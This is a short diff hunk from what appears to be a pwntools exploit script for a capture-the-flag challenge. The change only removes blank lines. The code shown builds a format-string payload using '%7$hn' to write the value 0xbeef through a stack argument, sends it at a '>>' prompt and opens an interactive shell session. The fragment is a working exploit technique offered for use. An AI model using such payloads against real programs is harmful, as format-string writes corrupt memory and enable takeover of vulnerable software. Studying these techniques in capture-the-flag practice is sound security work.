@@ -61,9 +61,7 @@ io = start()
 # --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---
 
 payload = b"%%%dx%%7$hn" % 0xbeef
-
 sla(b">> ", payload)
-
 
 io.interactive()
 
